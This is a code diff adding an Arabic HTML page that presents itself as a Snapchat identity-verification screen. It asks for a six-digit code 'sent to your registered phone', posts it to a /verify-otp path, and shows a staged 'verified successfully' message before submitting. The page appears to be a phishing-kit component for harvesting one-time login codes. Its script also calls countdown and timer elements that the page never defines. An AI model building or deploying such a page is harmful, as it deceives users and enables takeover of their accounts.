@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من الهوية - Snapchat</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            background: #f2f2f2;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .otp-container {
+            background: rgba(255, 255, 255, 0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            backdrop-filter: blur(10px);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .security-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 30px;
+            font-size: 35px;
+            color: white;
+            box-shadow: 0 8px 20px rgba(255, 107, 107, 0.3);
+        }
+        .form-label {
+            color: #0fadff;
+            font-weight: 450;
+            margin-bottom: 10px;
+        }
+        .otp-title {
+            color: #666;
+            font-weight: 450;
+            margin-bottom: 25px;
+        }
+        
+        .otp-subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        
+        .phone-number {
+            color: #FFFC00;
+            font-weight: 600;
+            background: rgba(255, 252, 0, 0.1);
+            padding: 2px 8px;
+            border-radius: 5px;
+        }
+        
+        .otp-input {
+            border: 1px solid #8d8d8d;
+		
+            border-radius: 10px;
+            padding: 12px 0 0 0;
+            background: #fff;
+            font-size: 16px;
+        }
+        
+        .otp-input:focus {
+            box-shadow: none;
+            border-bottom-color: #0fadff;
+            background: transparent;
+        }
+        
+        .submit-btn {
+            background: #0fadff;
+            border: none;
+            border-radius: 25px;
+            padding: 12px 40px;
+            font-weight: 600;
+            color: #fff;
+            width: 100%;
+            margin-top: 20px;
+            transition: all 0.3s ease;
+            font-size: 16px;
+        }
+        
+        .submit-btn:hover {
+            background: #0096e5;
+            transform: translateY(-2px);
+          
+            color: #fff;
+        }
+        
+        .resend-section {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #e0e0e0;
+        }
+        
+        .resend-text {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #667eea;
+            text-decoration: underline;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        
+        .resend-btn:hover {
+            color: #764ba2;
+        }
+        
+        .trouble-link {
+            color: #666;
+            text-decoration: none;
+            font-size: 14px;
+            margin-right: 15px;
+        }
+        
+        .trouble-link:hover {
+            color: #FFFC00;
+            text-decoration: none;
+        }
+        
+        @media (max-width: 480px) {
+            .otp-container {
+                padding: 30px 20px;
+                margin: 10px;
+            }
+            
+            .otp-title {
+                font-size: 20px;
+            }
+            
+            .otp-subtitle {
+                font-size: 14px;
+            }
+        }
+        
+        .timer {
+            color: #ff6b6b;
+            font-weight: 600;
+            font-size: 18px;
+            margin: 15px 0;
+        }
+        
+        .success-animation {
+            display: none;
+            color: #28a745;
+            font-size: 20px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="otp-container">
+       
+        
+        <h2 class="otp-title">رمز التحقق</h2>
+        
+        <p class="otp-subtitle">
+            لقد أرسلنا للتو رمز التحقق إلى هاتفك المسجل <br/> الرجاء إدخاله هنا
+        </p>
+        
+        <form method="POST" action="/verify-otp" id="otpForm">
+		<label class="form-label">أدخل الرمز</label>
+            <input type="text" 
+                   class="form-control otp-input" 
+                   id="otp_code" 
+                   name="otp_code" 
+                   placeholder="" 
+                   maxlength="6"
+                   required>
+          
+            
+            <button type="submit" class="btn submit-btn" id="submitBtn">
+                تحقق
+            </button>
+            
+            <div class="success-animation" id="successMsg">
+                <i class="fas fa-check-circle"></i> تم التحقق بنجاح!
+            </div>
+        </form>
+        
+        <div class="resend-section">
+            <p class="resend-text">لم تتلق الرمز؟</p>
+         
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.1.3/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // مؤقت العد التنازلي
+        let timeLeft = 300; // 5 دقائق بالثواني
+        
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('countdown').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                document.getElementById('timer').innerHTML = 
+                    '<span style="color: #ff6b6b;">انتهت صلاحية الرمز</span>';
+            }
+        }
+        
+        // بدء المؤقت
+        updateTimer();
+        
+        // تنسيق إدخال OTP
+        document.getElementById('otp_code').addEventListener('input', function(e) {
+            // إزالة أي أحرف غير رقمية
+            this.value = this.value.replace(/[^0-9]/g, '');
+            
+            // إضافة مسافات بين الأرقام للوضوح
+            if (this.value.length > 0) {
+                this.style.letterSpacing = '5px';
+            }
+        });
+        
+        // تحريك المؤشر إلى النهاية
+        document.getElementById('otp_code').addEventListener('focus', function(e) {
+            setTimeout(() => {
+                this.setSelectionRange(this.value.length, this.value.length);
+            }, 10);
+        });
+        
+        // تأثير التحقق
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            const submitBtn = document.getElementById('submitBtn');
+            const successMsg = document.getElementById('successMsg');
+            
+            // تأثير التحميل
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري التحقق...';
+            submitBtn.disabled = true;
+            
+            // محاكاة التأخير
+            setTimeout(() => {
+                successMsg.style.display = 'block';
+                setTimeout(() => {
+                    this.submit();
+                }, 1000);
+            }, 1500);
+            
+            e.preventDefault();
+        });
+        
+        function resendCode() {
+            // إعادة تعيين المؤقت
+            timeLeft = 300;
+            updateTimer();
+            
+            // تأثير بصري
+            const resendBtn = document.querySelector('.resend-btn');
+            const originalText = resendBtn.textContent;
+            resendBtn.textContent = 'تم الإرسال!';
+            resendBtn.style.color = '#28a745';
+            
+            setTimeout(() => {
+                resendBtn.textContent = originalText;
+                resendBtn.style.color = '#667eea';
+            }, 2000);
+        }
+        
+        // التنقل بالأسهم
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('otpForm').dispatchEvent(new Event('submit'));
+            }
+        });
+    </script>
+</body>
+</html>
